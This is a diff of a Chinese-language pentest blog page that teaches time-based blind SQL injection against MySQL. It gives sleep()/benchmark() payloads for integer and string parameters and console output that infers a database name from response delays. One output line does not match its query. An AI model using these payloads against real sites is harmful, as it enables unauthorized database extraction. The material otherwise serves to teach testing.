@@ -82,61 +82,52 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
 </div>
 
-      <div>
-
-<h3 id="0x00-特点">0x00 特点</h3>
-
-<pre><code>当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。
+      <div><h3 id="0x00-特点">0x00 特点</h3>
+<pre tabindex="0"><code>当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。
 其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。
-</code></pre>
-
-<h3 id="0x01-利用方式">0x01 利用方式</h3>
-
-<pre><code>整型注入的话可以直接: ?id=if(1=1,sleep(2),1)
-字符型的话需要闭合: ?id=2' and if(1=1,sleep(2),1) and '1
-</code></pre>
-
-<h3 id="0x02-相关函数">0x02 相关函数</h3>
-
+</code></pre><h3 id="0x01-利用方式">0x01 利用方式</h3>
+<pre tabindex="0"><code>整型注入的话可以直接: ?id=if(1=1,sleep(2),1)
+字符型的话需要闭合: ?id=2&#39; and if(1=1,sleep(2),1) and &#39;1
+</code></pre><h3 id="0x02-相关函数">0x02 相关函数</h3>
 <ul>
-<li><p>if(条件, 值1, 值2)<br />
-当条件为真时返回值1，条件为假时返回值2</p></li>
-
-<li><p>sleep()<br />
-sleep(2)睡眠两秒</p></li>
-
-<li><p>benchmark(count, expr)<br />
-benchmark是用于测试函数性能的，它是将表达式expr执行count次，执行次数越多耗费时间越久</p></li>
+<li>
+<p>if(条件, 值1, 值2)<br>
+当条件为真时返回值1，条件为假时返回值2</p>
+</li>
+<li>
+<p>sleep()<br>
+sleep(2)睡眠两秒</p>
+</li>
+<li>
+<p>benchmark(count, expr)<br>
+benchmark是用于测试函数性能的，它是将表达式expr执行count次，执行次数越多耗费时间越久</p>
+</li>
 </ul>
-
 <h3 id="0x03-基于时间的注入payload">0x03 基于时间的注入payload</h3>
-
-<pre><code>mysql&gt; select if((select database()) like &quot;rte%&quot;,sleep(2),666);
+<pre tabindex="0"><code>mysql&gt; select if((select database()) like &#34;rte%&#34;,sleep(2),666);
 +---------------------------------------------------+
-| if((select database()) like &quot;rte%&quot;,sleep(2),666)  |
+| if((select database()) like &#34;rte%&#34;,sleep(2),666)  |
 +---------------------------------------------------+
 |                                                 0 |
 +---------------------------------------------------+
 1 row in set (2.00 sec)
 
-mysql&gt; select if((select database())=&quot;rteaaa&quot;,sleep(2),666);
+mysql&gt; select if((select database())=&#34;rteaaa&#34;,sleep(2),666);
 +-----------------------------------------------+
-| if((select database())=&quot;rtest1&quot;,sleep(2),666) |
+| if((select database())=&#34;rtest1&#34;,sleep(2),666) |
 +-----------------------------------------------+
 |                                           666 |
 +-----------------------------------------------+
 1 row in set (0.00 sec)
 
-mysql&gt; select if((select database())=&quot;rtest&quot;,sleep(2),666);
+mysql&gt; select if((select database())=&#34;rtest&#34;,sleep(2),666);
 +----------------------------------------------+
-| if((select database())=&quot;rtest&quot;,sleep(2),666) |
+| if((select database())=&#34;rtest&#34;,sleep(2),666) |
 +----------------------------------------------+
 |                                            0 |
 +----------------------------------------------+
 1 row in set (2.00 sec)
-</code></pre>
-
-<pre><code>mysql&gt; select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),1);
+</code></pre><pre tabindex="0"><code>mysql&gt; select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),1);
 Empty set (2.32 sec)
 
 mysql&gt; select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(11)),1);
@@ -146,17 +137,17 @@ mysql&gt; select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(1
 |  1 | reber | first |
 +----+-------+-------+
 1 row in set (0.00 sec)
-</code></pre>
-
-<h3 id="0x04-简单注入">0x04 简单注入</h3>
-
+</code></pre><h3 id="0x04-简单注入">0x04 简单注入</h3>
 <ol>
-<li><p>判断闭合字符(and 1=1／and 1=2)
-<img src="/img/post/sqli9-get-closed-character-1.png" alt="得到闭合字符" />
-<img src="/img/post/sqli9-get-closed-character-2.png" alt="得到闭合字符" /></p></li>
-
-<li><p>得到数据库名字
-<img src="/img/post/sqli9-get-database.png" alt="得到数据库名字" /></p></li>
+<li>
+<p>判断闭合字符(and 1=1／and 1=2)
+<img src="/img/post/sqli9-get-closed-character-1.png" alt="得到闭合字符">
+<img src="/img/post/sqli9-get-closed-character-2.png" alt="得到闭合字符"></p>
+</li>
+<li>
+<p>得到数据库名字
+<img src="/img/post/sqli9-get-database.png" alt="得到数据库名字"></p>
+</li>
 </ol>
 </div>
     </article>
